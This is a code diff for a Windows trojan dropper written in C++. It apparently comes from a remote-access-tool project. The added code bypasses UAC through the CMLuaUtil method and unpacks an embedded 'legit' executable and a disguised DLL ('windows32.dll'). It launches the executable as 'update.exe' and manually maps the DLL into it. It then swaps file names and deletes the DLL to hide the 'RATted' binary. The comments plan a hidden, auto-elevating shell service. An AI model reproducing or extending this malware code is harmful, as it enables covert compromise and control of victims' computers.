@@ -1,5 +1,6 @@
 #include "injection.h"
 #include "utils.h"
+#include "embeds.h"
 
 #include <windows.h>
 #include <string>
@@ -15,9 +16,7 @@ extern "C" {
     #include "ntstatus.h"
 }
 
-WCHAR* ExePath();
-std::string GetCWD();
-NTSTATUS StartProcessAsAdmin(LPWSTR lpName);
+NTSTATUS StartProcessAsAdmin(LPWSTR lpName, BOOL bHide = TRUE);
 
 #define JOIN(x, y) x ## y
 #ifdef _WIN64
@@ -26,9 +25,15 @@ NTSTATUS StartProcessAsAdmin(LPWSTR lpName);
 #define FULL_PATH(x) JOIN("C:\\Windows\\SysWOW64\\", x)
 #endif
 
-#define		MY_DLL		"DllTest.dll"
+#define     MY_DLL      "windows32.dll"
+#define     MY_TARGET   "update.exe"
 
-#define		MY_PROC		"explorer.exe"
+///////////////////////////////////////////////////////////////////////////
+//  To do:
+//  Make sure that shell has an auto elevation mechanism in place just in case something happens and it doesn't start as privileged
+//  Make sure the service gets started after being created (Test shell as a standalone module)
+///////////////////////////////////////////////////////////////////////////
+
 
 //WinMain is the entry point for windows subsystem (GUI apps) but without initializing the window the process will be hidden graphically
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
@@ -39,26 +44,62 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     UNREFERENCED_PARAMETER(hPrevInstance);
     UNREFERENCED_PARAMETER(lpCmdLine);
 
+    //Alloc console for debugging purposes since the manual mapper can't be compiled in debug
+    //AllocConsole();
+    //FILE* f;
+    //freopen_s(&f, "CONOUT$", "w", stdout);
+
 	//Must be called before calling UAC bypass due to it manipulating/faking executable information
 	auto cwd = GetCWD();
+    auto target = (cwd + std::string(MY_TARGET)); //Full path to the target executable
 
     if (!Utils::IsElevated()) {
-        StartProcessAsAdmin((LPWSTR)ExePath());
+        StartProcessAsAdmin((LPWSTR)ExePathW(), FALSE);
         return 0;
     }
-	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Utils::getProcess(MY_PROC));
-	if (!hProc) {
-        hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Utils::getProcess(MY_PROC));
-        Sleep(10000);
-	}
 
+    //Extracts the legit image and dll to execute from its own image and starts it (inherits administrator permission from parent process)
+    Utils::ExtractImageToDisk(embedded_image_1, embedded_image_1_size, target); //First embedded image should be the legit executable
+    Utils::ExtractImageToDisk(embedded_image_2, embedded_image_2_size, cwd + MY_DLL);
+    STARTUPINFO info = { sizeof(info) };
+    PROCESS_INFORMATION processInfo;
+    while (!CreateProcessA(target.c_str(), (LPSTR)"", NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
+    {
+        Sleep(100);
+    }
+    CloseHandle(processInfo.hThread);
+
+    //Open handle to legit process
+	HANDLE hProc = processInfo.hProcess;
+    if (!hProc) { //Try getting an handle using this same proc name in case the legit app is a console application
+        hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Utils::getProcess(MY_TARGET));
+    }
+	//while (!hProc) {
+    //    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Utils::getProcess(MY_TARGET));
+    //    if (!hProc) { 
+    //        hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Utils::getProcess(ExeModuleName().c_str()));
+    //    }
+    //    Sleep(1000);
+	//}
 	//Manual map my DLL inside target process and call DllMain
 	auto pMyDll = ManualMap(hProc, (cwd + MY_DLL).c_str());
-	if (!pMyDll) {
+	while (!pMyDll) {
         pMyDll = ManualMap(hProc, (cwd + MY_DLL).c_str());
-        Sleep(10000);
+        Sleep(1000);
 	}
 	CloseHandle(hProc);
+
+    auto full_path = ExePathA();
+    while (rename(full_path , (GetCWD() + "trash.tmp").c_str()) != 0) {
+        Sleep(100);
+    }
+
+    while (rename(target.c_str(), full_path)) { //Rename update.exe to this file's original name to let Dll know it can delete the RATted version from disk
+        Sleep(100);
+    }
+
+    //Remove my dll from disk just in case idk
+    remove((cwd + MY_DLL).c_str());
 
 	return 0;
 }
@@ -145,7 +186,7 @@ NTSTATUS ucmInit(
     return Result;
 }
 
-NTSTATUS StartProcessAsAdmin(LPWSTR lpName) {
+NTSTATUS StartProcessAsAdmin(LPWSTR lpName, BOOL bHide) {
 
     NTSTATUS    Status;
     UCM_METHOD  method = UacMethodCMLuaUtil;
@@ -170,20 +211,5 @@ NTSTATUS StartProcessAsAdmin(LPWSTR lpName) {
         return STATUS_NOT_SUPPORTED;
     }
 
-    ucmCMLuaUtilShellExecMethod(lpName);
-}
-
-std::string GetCWD() {
-    WCHAR buffer[MAX_PATH] = { 0 };
-    GetModuleFileNameW(NULL, buffer, MAX_PATH);
-    std::wstring ws(buffer);
-    std::string file_path(ws.begin(), ws.end());
-    std::wstring::size_type pos = file_path.find_last_of("\\/");
-    return file_path.substr(0, pos + 1);
-}
-
-WCHAR* ExePath() {
-    WCHAR buffer[MAX_PATH] = { 0 };
-    GetModuleFileNameW(NULL, buffer, MAX_PATH);
-    return buffer;
+    ucmCMLuaUtilShellExecMethod(lpName, bHide);
 }
